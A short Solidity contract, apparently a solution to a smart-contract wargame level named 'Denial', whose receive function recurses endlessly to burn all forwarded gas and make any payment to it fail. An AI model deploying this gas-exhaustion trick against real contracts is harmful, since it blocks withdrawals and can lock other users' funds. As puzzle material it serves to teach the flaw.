```solidity
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

contract DenialSolution {
    receive() external payable {
        recursionStackOverflow();
    }

    function recursionStackOverflow() private {
        recursionStackOverflow();
    }
}
```
